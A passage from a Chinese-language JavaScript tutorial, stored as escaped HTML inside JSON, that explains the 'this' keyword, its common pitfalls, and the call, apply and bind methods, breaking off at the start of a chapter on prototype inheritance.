&#039;姓名：&#039;+ this.name;\n  }\n};\n\nvar name = &#039;李四&#039;;\nvar f = A.describe;\nf() // &quot;姓名：李四&quot;</code></pre><p>上面代码中，<code>A.describe</code>被赋值给变量<code>f</code>，内部的<code>this</code>就会指向<code>f</code>运行时所在的对象（本例是顶层对象）。</p>\n<p>再看一个网页编程的例子。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;input type=&quot;text&quot; name=&quot;age&quot; size=3 onChange=&quot;validate(this, 18, 99);&quot;&gt;\n\n&lt;script&gt;\nfunction validate(obj, lowval, hival){\n  if ((obj.value &lt; lowval) || (obj.value &gt; hival))\n    console.log(&#039;Invalid Value!&#039;);\n}\n&lt;/script&gt;</code></pre><p>上面代码是一个文本输入框，每当用户输入一个值，就会调用<code>onChange</code>回调函数，验证这个值是否在指定范围。浏览器会向回调函数传入当前对象，因此<code>this</code>就代表传入当前对象（即文本框），然后就可以从<code>this.value</code>上面读到用户的输入值。</p>\n<p>总结一下，JavaScript 语言之中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行，<code>this</code>就是函数运行时所在的对象（环境）。这本来并不会让用户糊涂，但是 JavaScript 支持运行环境动态切换，也就是说，<code>this</code>的指向是动态的，没有办法事先确定到底指向哪个对象，这才是最让初学者感到困惑的地方。</p>\n\n        <h2>\n            <a href='#实质' class='header-anchor'>#</a>\n            <span>实质</span>\n        </h2>\n    <p>JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { foo:  5 };</code></pre><p>上面的代码将一个对象赋值给变量<code>obj</code>。JavaScript 引擎会先在内存里面，生成一个对象<code>{ foo: 5 }</code>，然后把这个对象的内存地址赋值给变量<code>obj</code>。也就是说，变量<code>obj</code>是一个地址（reference）。后面如果要读取<code>obj.foo</code>，引擎先从<code>obj</code>拿到内存地址，然后再从该地址读出原始的对象，返回它的<code>foo</code>属性。</p>\n<p>原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的<code>foo</code>属性，实际上是以下面的形式保存的。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  foo: {\n    [[value]]: 5\n    [[writable]]: true\n    [[enumerable]]: true\n    [[configurable]]: true\n  }\n}</code></pre><p>注意，<code>foo</code>属性的值保存在属性描述对象的<code>value</code>属性里面。</p>\n<p>这样的结构是很清晰的，问题在于属性的值可能是一个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { foo: function () {} };</code></pre><p>这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给<code>foo</code>属性的<code>value</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  foo: {\n    [[value]]: 函数的地址\n    ...\n  }\n}</code></pre><p>由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {};\nvar obj = { f: f };\n\n// 单独执行\nf()\n\n// obj 环境执行\nobj.f()</code></pre><p>JavaScript 允许在函数体内部，引用当前环境的其他变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(x);\n};</code></pre><p>上面代码中，函数体里面使用了变量<code>x</code>。该变量由运行环境提供。</p>\n<p>现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(this.x);\n}</code></pre><p>上面代码中，函数体里面的<code>this.x</code>就是指当前运行环境的<code>x</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(this.x);\n}\n\nvar x = 1;\nvar obj = {\n  f: f,\n  x: 2,\n};\n\n// 单独执行\nf() // 1\n\n// obj 环境执行\nobj.f() // 2</code></pre><p>上面代码中，函数<code>f</code>在全局环境执行，<code>this.x</code>指向全局环境的<code>x</code>；在<code>obj</code>环境执行，<code>this.x</code>指向<code>obj.x</code>。</p>\n\n        <h2>\n            <a href='#使用场合' class='header-anchor'>#</a>\n            <span>使用场合</span>\n        </h2>\n    <p><code>this</code>主要有以下几个使用场合。</p>\n<p><strong>（1）全局环境</strong></p>\n<p>全局环境使用<code>this</code>，它指的就是顶层对象<code>window</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>this === window // true\n\nfunction f() {\n  console.log(this === window);\n}\nf() // true</code></pre><p>上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，<code>this</code>就是指顶层对象<code>window</code>。</p>\n<p><strong>（2）构造函数</strong></p>\n<p>构造函数中的<code>this</code>，指的是实例对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var Obj = function (p) {\n  this.p = p;\n};</code></pre><p>上面代码定义了一个构造函数<code>Obj</code>。由于<code>this</code>指向实例对象，所以在构造函数内部定义<code>this.p</code>，就相当于定义实例对象有一个<code>p</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = new Obj(&#039;Hello World!&#039;);\no.p // &quot;Hello World!&quot;</code></pre><p><strong>（3）对象的方法</strong></p>\n<p>如果对象的方法里面包含<code>this</code>，<code>this</code>的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变<code>this</code>的指向。</p>\n<p>但是，这条规则很不容易把握。请看下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj ={\n  foo: function () {\n    console.log(this);\n  }\n};\n\nobj.foo() // obj</code></pre><p>上面代码中，<code>obj.foo</code>方法执行时，它内部的<code>this</code>指向<code>obj</code>。</p>\n<p>但是，下面这几种用法，都会改变<code>this</code>的指向。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 情况一\n(obj.foo = obj.foo)() // window\n// 情况二\n(false || obj.foo)() // window\n// 情况三\n(1, obj.foo)() // window</code></pre><p>上面代码中，<code>obj.foo</code>就是一个值。这个值真正调用的时候，运行环境已经不是<code>obj</code>了，而是全局环境，所以<code>this</code>不再指向<code>obj</code>。</p>\n<p>可以这样理解，JavaScript 引擎内部，<code>obj</code>和<code>obj.foo</code>储存在两个内存地址，称为地址一和地址二。<code>obj.foo()</code>这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，<code>this</code>指向<code>obj</code>。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此<code>this</code>指向全局环境。上面三种情况等同于下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 情况一\n(obj.foo = function () {\n  console.log(this);\n})()\n// 等同于\n(function () {\n  console.log(this);\n})()\n\n// 情况二\n(false || function () {\n  console.log(this);\n})()\n\n// 情况三\n(1, function () {\n  console.log(this);\n})()</code></pre><p>如果<code>this</code>所在的方法不在对象的第一层，这时<code>this</code>只是指向当前一层的对象，而不会继承更上面的层。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = {\n  p: &#039;Hello&#039;,\n  b: {\n    m: function() {\n      console.log(this.p);\n    }\n  }\n};\n\na.b.m() // undefined</code></pre><p>上面代码中，<code>a.b.m</code>方法在<code>a</code>对象的第二层，该方法内部的<code>this</code>不是指向<code>a</code>，而是指向<code>a.b</code>，因为实际执行的是下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var b = {\n  m: function() {\n   console.log(this.p);\n  }\n};\n\nvar a = {\n  p: &#039;Hello&#039;,\n  b: b\n};\n\n(a.b).m() // 等同于 b.m()</code></pre><p>如果要达到预期效果，只有写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = {\n  b: {\n    m: function() {\n      console.log(this.p);\n    },\n    p: &#039;Hello&#039;\n  }\n};</code></pre><p>如果这时将嵌套对象内部的方法赋值给一个变量，<code>this</code>依然会指向全局对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = {\n  b: {\n    m: function() {\n      console.log(this.p);\n    },\n    p: &#039;Hello&#039;\n  }\n};\n\nvar hello = a.b.m;\nhello() // undefined</code></pre><p>上面代码中，<code>m</code>是多层对象内部的一个方法。为求简便，将其赋值给<code>hello</code>变量，结果调用时，<code>this</code>指向了顶层对象。为了避免这个问题，可以只将<code>m</code>所在的对象赋值给<code>hello</code>，这样调用时，<code>this</code>的指向就不会变。</p>\n<pre class=\"prettyprint language-javascript\"><code>var hello = a.b;\nhello.m() // Hello</code></pre>\n        <h2>\n            <a href='#使用注意点' class='header-anchor'>#</a>\n            <span>使用注意点</span>\n        </h2>\n    \n        <h3>\n            <a href='#避免多层-this' class='header-anchor'>#</a>\n            <span>避免多层 this</span>\n        </h3>\n    <p>由于<code>this</code>的指向是不确定的，所以切勿在函数中包含多层的<code>this</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {\n  f1: function () {\n    console.log(this);\n    var f2 = function () {\n      console.log(this);\n    }();\n  }\n}\n\no.f1()\n// Object\n// Window</code></pre><p>上面代码包含两层<code>this</code>，结果运行后，第一层指向对象<code>o</code>，第二层指向全局对象，因为实际执行的是下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var temp = function () {\n  console.log(this);\n};\n\nvar o = {\n  f1: function () {\n    console.log(this);\n    var f2 = temp();\n  }\n}</code></pre><p>一个解决方法是在第二层改用一个指向外层<code>this</code>的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {\n  f1: function() {\n    console.log(this);\n    var that = this;\n    var f2 = function() {\n      console.log(that);\n    }();\n  }\n}\n\no.f1()\n// Object\n// Object</code></pre><p>上面代码定义了变量<code>that</code>，固定指向外层的<code>this</code>，然后在内层使用<code>that</code>，就不会发生<code>this</code>指向的改变。</p>\n<p>事实上，使用一个变量固定<code>this</code>的值，然后内层函数调用这个变量，是非常常见的做法，请务必掌握。</p>\n<p>JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的<code>this</code>指向顶层对象，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var counter = {\n  count: 0\n};\ncounter.inc = function () {\n  &#039;use strict&#039;;\n  this.count++\n};\nvar f = counter.inc;\nf()\n// TypeError: Cannot read property &#039;count&#039; of undefined</code></pre><p>上面代码中，<code>inc</code>方法通过<code>&#39;use strict&#39;</code>声明采用严格模式，这时内部的<code>this</code>一旦指向顶层对象，就会报错。</p>\n\n        <h3>\n            <a href='#避免数组处理方法中的-this' class='header-anchor'>#</a>\n            <span>避免数组处理方法中的 this</span>\n        </h3>\n    <p>数组的<code>map</code>和<code>foreach</code>方法，允许提供一个函数作为参数。这个函数内部不应该使用<code>this</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {\n  v: &#039;hello&#039;,\n  p: [ &#039;a1&#039;, &#039;a2&#039; ],\n  f: function f() {\n    this.p.forEach(function (item) {\n      console.log(this.v + &#039; &#039; + item);\n    });\n  }\n}\n\no.f()\n// undefined a1\n// undefined a2</code></pre><p>上面代码中，<code>foreach</code>方法的回调函数中的<code>this</code>，其实是指向<code>window</code>对象，因此取不到<code>o.v</code>的值。原因跟上一段的多层<code>this</code>是一样的，就是内层的<code>this</code>不指向外部，而指向顶层对象。</p>\n<p>解决这个问题的一种方法，就是前面提到的，使用中间变量固定<code>this</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {\n  v: &#039;hello&#039;,\n  p: [ &#039;a1&#039;, &#039;a2&#039; ],\n  f: function f() {\n    var that = this;\n    this.p.forEach(function (item) {\n      console.log(that.v+&#039; &#039;+item);\n    });\n  }\n}\n\no.f()\n// hello a1\n// hello a2</code></pre><p>另一种方法是将<code>this</code>当作<code>foreach</code>方法的第二个参数，固定它的运行环境。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {\n  v: &#039;hello&#039;,\n  p: [ &#039;a1&#039;, &#039;a2&#039; ],\n  f: function f() {\n    this.p.forEach(function (item) {\n      console.log(this.v + &#039; &#039; + item);\n    }, this);\n  }\n}\n\no.f()\n// hello a1\n// hello a2</code></pre>\n        <h3>\n            <a href='#避免回调函数中的-this' class='header-anchor'>#</a>\n            <span>避免回调函数中的 this</span>\n        </h3>\n    <p>回调函数中的<code>this</code>往往会改变指向，最好避免使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = new Object();\no.f = function () {\n  console.log(this === o);\n}\n\n// jQuery 的写法\n$(&#039;#button&#039;).on(&#039;click&#039;, o.f);</code></pre><p>上面代码中，点击按钮以后，控制台会显示<code>false</code>。原因是此时<code>this</code>不再指向<code>o</code>对象，而是指向按钮的 DOM 对象，因为<code>f</code>方法是在按钮对象的环境中被调用的。这种细微的差别，很容易在编程中忽视，导致难以察觉的错误。</p>\n<p>为了解决这个问题，可以采用下面的一些方法对<code>this</code>进行绑定，也就是使得<code>this</code>固定指向某个对象，减少不确定性。</p>\n\n        <h2>\n            <a href='#绑定-this-的方法' class='header-anchor'>#</a>\n            <span>绑定 this 的方法</span>\n        </h2>\n    <p><code>this</code>的动态切换，固然为 JavaScript 创造了巨大的灵活性，但也使得编程变得困难和模糊。有时，需要把<code>this</code>固定下来，避免出现意想不到的情况。JavaScript 提供了<code>call</code>、<code>apply</code>、<code>bind</code>这三个方法，来切换/固定<code>this</code>的指向。</p>\n\n        <h3>\n            <a href='#Function.prototype.call()' class='header-anchor'>#</a>\n            <span>Function.prototype.call()</span>\n        </h3>\n    <p>函数实例的<code>call</code>方法，可以指定函数内部<code>this</code>的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nvar f = function () {\n  return this;\n};\n\nf() === window // true\nf.call(obj) === obj // true</code></pre><p>上面代码中，全局环境运行函数<code>f</code>时，<code>this</code>指向全局环境（浏览器为<code>window</code>对象）；<code>call</code>方法可以改变<code>this</code>的指向，指定<code>this</code>指向对象<code>obj</code>，然后在对象<code>obj</code>的作用域中运行函数<code>f</code>。</p>\n<p><code>call</code>方法的参数，应该是一个对象。如果参数为空、<code>null</code>和<code>undefined</code>，则默认传入全局对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 123;\nvar obj = { n: 456 };\n\nfunction a() {\n  console.log(this.n);\n}\n\na.call() // 123\na.call(null) // 123\na.call(undefined) // 123\na.call(window) // 123\na.call(obj) // 456</code></pre><p>上面代码中，<code>a</code>函数中的<code>this</code>关键字，如果指向全局对象，返回结果为<code>123</code>。如果使用<code>call</code>方法将<code>this</code>关键字指向<code>obj</code>对象，返回结果为<code>456</code>。可以看到，如果<code>call</code>方法没有参数，或者参数为<code>null</code>或<code>undefined</code>，则等同于指向全局对象。</p>\n<p>如果<code>call</code>方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入<code>call</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  return this;\n};\n\nf.call(5)\n// Number {[[PrimitiveValue]]: 5}</code></pre><p>上面代码中，<code>call</code>的参数为<code>5</code>，不是对象，会被自动转成包装对象（<code>Number</code>的实例），绑定<code>f</code>内部的<code>this</code>。</p>\n<p><code>call</code>方法还可以接受多个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>func.call(thisValue, arg1, arg2, ...)</code></pre><p><code>call</code>的第一个参数就是<code>this</code>所要指向的那个对象，后面的参数则是函数调用时所需的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(a, b) {\n  return a + b;\n}\n\nadd.call(this, 1, 2) // 3</code></pre><p>上面代码中，<code>call</code>方法指定函数<code>add</code>内部的<code>this</code>绑定当前环境（对象），并且参数为<code>1</code>和<code>2</code>，因此函数<code>add</code>运行后得到<code>3</code>。</p>\n<p><code>call</code>方法的一个应用是调用对象的原生方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.hasOwnProperty(&#039;toString&#039;) // false\n\n// 覆盖掉继承的 hasOwnProperty 方法\nobj.hasOwnProperty = function () {\n  return true;\n};\nobj.hasOwnProperty(&#039;toString&#039;) // true\n\nObject.prototype.hasOwnProperty.call(obj, &#039;toString&#039;) // false</code></pre><p>上面代码中，<code>hasOwnProperty</code>是<code>obj</code>对象继承的方法，如果这个方法一旦被覆盖，就不会得到正确结果。<code>call</code>方法可以解决这个问题，它将<code>hasOwnProperty</code>方法的原始定义放到<code>obj</code>对象上执行，这样无论<code>obj</code>上有没有同名方法，都不会影响结果。</p>\n\n        <h3>\n            <a href='#Function.prototype.apply()' class='header-anchor'>#</a>\n            <span>Function.prototype.apply()</span>\n        </h3>\n    <p><code>apply</code>方法的作用与<code>call</code>方法类似，也是改变<code>this</code>指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>func.apply(thisValue, [arg1, arg2, ...])</code></pre><p><code>apply</code>方法的第一个参数也是<code>this</code>所要指向的那个对象，如果设为<code>null</code>或<code>undefined</code>，则等同于指定全局对象。第二个参数则是一个数组，该数组的所有成员依次作为参数，传入原函数。原函数的参数，在<code>call</code>方法中必须一个个添加，但是在<code>apply</code>方法中，必须以数组形式添加。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(x, y){\n  console.log(x + y);\n}\n\nf.call(null, 1, 1) // 2\nf.apply(null, [1, 1]) // 2</code></pre><p>上面代码中，<code>f</code>函数本来接受两个参数，使用<code>apply</code>方法以后，就变成可以接受一个数组作为参数。</p>\n<p>利用这一点，可以做一些有趣的应用。</p>\n<p><strong>（1）找出数组最大元素</strong></p>\n<p>JavaScript 不提供找出数组最大元素的函数。结合使用<code>apply</code>方法和<code>Math.max</code>方法，就可以返回数组的最大元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [10, 2, 4, 15, 9];\nMath.max.apply(null, a) // 15</code></pre><p><strong>（2）将数组的空元素变为<code>undefined</code></strong></p>\n<p>通过<code>apply</code>方法，利用<code>Array</code>构造函数将数组的空元素变成<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.apply(null, [&#039;a&#039;, ,&#039;b&#039;])\n// [ &#039;a&#039;, undefined, &#039;b&#039; ]</code></pre><p>空元素与<code>undefined</code>的差别在于，数组的<code>forEach</code>方法会跳过空元素，但是不会跳过<code>undefined</code>。因此，遍历内部元素的时候，会得到不同的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, , &#039;b&#039;];\n\nfunction print(i) {\n  console.log(i);\n}\n\na.forEach(print)\n// a\n// b\n\nArray.apply(null, a).forEach(print)\n// a\n// undefined\n// b</code></pre><p><strong>（3）转换类似数组的对象</strong></p>\n<p>另外，利用数组对象的<code>slice</code>方法，可以将一个类似数组的对象（比如<code>arguments</code>对象）转为真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.slice.apply({0: 1, length: 1}) // [1]\nArray.prototype.slice.apply({0: 1}) // []\nArray.prototype.slice.apply({0: 1, length: 2}) // [1, undefined]\nArray.prototype.slice.apply({length: 1}) // [undefined]</code></pre><p>上面代码的<code>apply</code>方法的参数都是对象，但是返回结果都是数组，这就起到了将对象转成数组的目的。从上面代码可以看到，这个方法起作用的前提是，被处理的对象必须有<code>length</code>属性，以及相对应的数字键。</p>\n<p><strong>（4）绑定回调函数的对象</strong></p>\n<p>前面的按钮点击事件的例子，可以改写如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = new Object();\n\no.f = function () {\n  console.log(this === o);\n}\n\nvar f = function (){\n  o.f.apply(o);\n  // 或者 o.f.call(o);\n};\n\n// jQuery 的写法\n$(&#039;#button&#039;).on(&#039;click&#039;, f);</code></pre><p>上面代码中，点击按钮以后，控制台将会显示<code>true</code>。由于<code>apply</code>方法（或者<code>call</code>方法）不仅绑定函数执行时所在的对象，还会立即执行函数，因此不得不把绑定语句写在一个函数体内。更简洁的写法是采用下面介绍的<code>bind</code>方法。</p>\n\n        <h3>\n            <a href='#Function.prototype.bind()' class='header-anchor'>#</a>\n            <span>Function.prototype.bind()</span>\n        </h3>\n    <p><code>bind</code>方法用于将函数体内的<code>this</code>绑定到某个对象，然后返回一个新函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\nd.getTime() // 1481869925657\n\nvar print = d.getTime;\nprint() // Uncaught TypeError: this is not a Date object.</code></pre><p>上面代码中，我们将<code>d.getTime</code>方法赋给变量<code>print</code>，然后调用<code>print</code>就报错了。这是因为<code>getTime</code>方法内部的<code>this</code>，绑定<code>Date</code>对象的实例，赋给变量<code>print</code>以后，内部的<code>this</code>已经不指向<code>Date</code>对象的实例了。</p>\n<p><code>bind</code>方法可以解决这个问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = d.getTime.bind(d);\nprint() // 1481869925657</code></pre><p>上面代码中，<code>bind</code>方法将<code>getTime</code>方法内部的<code>this</code>绑定到<code>d</code>对象，这时就可以安全地将这个方法赋值给其他变量了。</p>\n<p><code>bind</code>方法的参数就是所要绑定<code>this</code>的对象，下面是一个更清晰的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var counter = {\n  count: 0,\n  inc: function () {\n    this.count++;\n  }\n};\n\nvar func = counter.inc.bind(counter);\nfunc();\ncounter.count // 1</code></pre><p>上面代码中，<code>counter.inc</code>方法被赋值给变量<code>func</code>。这时必须用<code>bind</code>方法将<code>inc</code>内部的<code>this</code>，绑定到<code>counter</code>，否则就会出错。</p>\n<p><code>this</code>绑定到其他对象也是可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var counter = {\n  count: 0,\n  inc: function () {\n    this.count++;\n  }\n};\n\nvar obj = {\n  count: 100\n};\nvar func = counter.inc.bind(obj);\nfunc();\nobj.count // 101</code></pre><p>上面代码中，<code>bind</code>方法将<code>inc</code>方法内部的<code>this</code>，绑定到<code>obj</code>对象。结果调用<code>func</code>函数以后，递增的就是<code>obj</code>内部的<code>count</code>属性。</p>\n<p><code>bind</code>还可以接受更多的参数，将这些参数绑定原函数的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var add = function (x, y) {\n  return x * this.m + y * this.n;\n}\n\nvar obj = {\n  m: 2,\n  n: 2\n};\n\nvar newAdd = add.bind(obj, 5);\nnewAdd(5) // 20</code></pre><p>上面代码中，<code>bind</code>方法除了绑定<code>this</code>对象，还将<code>add</code>函数的第一个参数<code>x</code>绑定成<code>5</code>，然后返回一个新函数<code>newAdd</code>，这个函数只要再接受一个参数<code>y</code>就能运行了。</p>\n<p>如果<code>bind</code>方法的第一个参数是<code>null</code>或<code>undefined</code>，等于将<code>this</code>绑定到全局对象，函数运行时<code>this</code>指向顶层对象（浏览器为<code>window</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\nvar plus5 = add.bind(null, 5);\nplus5(10) // 15</code></pre><p>上面代码中，函数<code>add</code>内部并没有<code>this</code>，使用<code>bind</code>方法的主要目的是绑定参数<code>x</code>，以后每次运行新函数<code>plus5</code>，就只需要提供另一个参数<code>y</code>就够了。而且因为<code>add</code>内部没有<code>this</code>，所以<code>bind</code>的第一个参数是<code>null</code>，不过这里如果是其他对象，也没有影响。</p>\n<p><code>bind</code>方法有一些使用注意点。</p>\n<p><strong>（1）每一次返回一个新函数</strong></p>\n<p><code>bind</code>方法每运行一次，就返回一个新函数，这会产生一些问题。比如，监听事件的时候，不能写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.addEventListener(&#039;click&#039;, o.m.bind(o));</code></pre><p>上面代码中，<code>click</code>事件绑定<code>bind</code>方法生成的一个匿名函数。这样会导致无法取消绑定，所以，下面的代码是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>element.removeEventListener(&#039;click&#039;, o.m.bind(o));</code></pre><p>正确的方法是写成下面这样：</p>\n<pre class=\"prettyprint language-javascript\"><code>var listener = o.m.bind(o);\nelement.addEventListener(&#039;click&#039;, listener);\n//  ...\nelement.removeEventListener(&#039;click&#039;, listener);</code></pre><p><strong>（2）结合回调函数使用</strong></p>\n<p>回调函数是 JavaScript 最常用的模式之一，但是一个常见的错误是，将包含<code>this</code>的方法直接当作回调函数。解决方法就是使用<code>bind</code>方法，将<code>counter.inc</code>绑定<code>counter</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var counter = {\n  count: 0,\n  inc: function () {\n    &#039;use strict&#039;;\n    this.count++;\n  }\n};\n\nfunction callIt(callback) {\n  callback();\n}\n\ncallIt(counter.inc.bind(counter));\ncounter.count // 1</code></pre><p>上面代码中，<code>callIt</code>方法会调用回调函数。这时如果直接把<code>counter.inc</code>传入，调用时<code>counter.inc</code>内部的<code>this</code>就会指向全局对象。使用<code>bind</code>方法将<code>counter.inc</code>绑定<code>counter</code>以后，就不会有这个问题，<code>this</code>总是指向<code>counter</code>。</p>\n<p>还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的<code>this</code>指向，很可能也会出错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  name: &#039;张三&#039;,\n  times: [1, 2, 3],\n  print: function () {\n    this.times.forEach(function (n) {\n      console.log(this.name);\n    });\n  }\n};\n\nobj.print()\n// 没有任何输出</code></pre><p>上面代码中，<code>obj.print</code>内部<code>this.times</code>的<code>this</code>是指向<code>obj</code>的，这个没有问题。但是，<code>forEach</code>方法的回调函数内部的<code>this.name</code>却是指向全局对象，导致没有办法取到值。稍微改动一下，就可以看得更清楚。</p>\n<pre class=\"prettyprint language-javascript\"><code>obj.print = function () {\n  this.times.forEach(function (n) {\n    console.log(this === window);\n  });\n};\n\nobj.print()\n// true\n// true\n// true</code></pre><p>解决这个问题，也是通过<code>bind</code>方法绑定<code>this</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>obj.print = function () {\n  this.times.forEach(function (n) {\n    console.log(this.name);\n  }.bind(this));\n};\n\nobj.print()\n// 张三\n// 张三\n// 张三</code></pre><p><strong>（3）结合<code>call</code>方法使用</strong></p>\n<p>利用<code>bind</code>方法，可以改写一些 JavaScript 原生方法的使用形式，以数组的<code>slice</code>方法为例。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].slice(0, 1) // [1]\n// 等同于\nArray.prototype.slice.call([1, 2, 3], 0, 1) // [1]</code></pre><p>上面的代码中，数组的<code>slice</code>方法从<code>[1, 2, 3]</code>里面，按照指定位置和长度切分出另一个数组。这样做的本质是在<code>[1, 2, 3]</code>上面调用<code>Array.prototype.slice</code>方法，因此可以用<code>call</code>方法表达这个过程，得到同样的结果。</p>\n<p><code>call</code>方法实质上是调用<code>Function.prototype.call</code>方法，因此上面的表达式可以用<code>bind</code>方法改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>var slice = Function.prototype.call.bind(Array.prototype.slice);\nslice([1, 2, 3], 0, 1) // [1]</code></pre><p>上面代码的含义就是，将<code>Array.prototype.slice</code>变成<code>Function.prototype.call</code>方法所在的对象，调用时就变成了<code>Array.prototype.slice.call</code>。类似的写法还可以用于其他数组方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var push = Function.prototype.call.bind(Array.prototype.push);\nvar pop = Function.prototype.call.bind(Array.prototype.pop);\n\nvar a = [1 ,2 ,3];\npush(a, 4)\na // [1, 2, 3, 4]\n\npop(a)\na // [1, 2, 3]</code></pre><p>如果再进一步，将<code>Function.prototype.call</code>方法绑定到<code>Function.prototype.bind</code>对象，就意味着<code>bind</code>的调用形式也可以被改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(this.v);\n}\n\nvar o = { v: 123 };\nvar bind = Function.prototype.call.bind(Function.prototype.bind);\nbind(f, o)() // 123</code></pre><p>上面代码的含义就是，将<code>Function.prototype.bind</code>方法绑定在<code>Function.prototype.call</code>上面，所以<code>bind</code>方法就可以直接使用，不需要在函数实例上使用。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Jonathan Creamer, <a href=\"http://tech.pro/tutorial/1192/avoiding-the-this-problem-in-javascript\">Avoiding the &quot;this&quot; problem in JavaScript</a></li>\n<li>Erik Kronberg, <a href=\"https://variadic.me/posts/2013-10-22-bind-call-and-apply-in-javascript.html\">Bind, Call and Apply in JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2014/05/this.html\">JavaScript’s this: how it works, where it can trip you up</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"面向对象编程","link":"javascript:void(0)"},{"title":"对象的继承","link":"/oop/prototype.html"}],"content":"\n        <h1>\n            <a href='#对象的继承' class='header-anchor'>#</a>\n            <span>对象的继承</span>\n        </h1>\n    <p>面向对象编程很重要的一个方面，就是对象的继承。A 对象通过继承 B 对象，就能直接拥有 B 对象的所有属性和方法。这对于代码的复用是非常有用的。</p>\n<p>大部分面向对象的编程语言，都是通过“类”（class）来实现对象的继承。JavaScript 语言的继承则是通过“原型对象”（prototype）。</p>\n\n        <h2>\n            <a href='#原型对象概述' class='header-anchor'>#</a>\n            <span>原型对象概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#构造函数的缺点' class='header-anchor'>#</a>\n            <span>构造函数的缺点</span>\n        </h3>\n    <p>JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Cat (name, color) {\n  this.name = name;\n  this.color = color;\n}\n\nvar cat1 = new Cat(&#039;大毛&#039;, &#039;白色&#039;);\n\ncat1.name // &#039;大毛&#039;\ncat1.color // 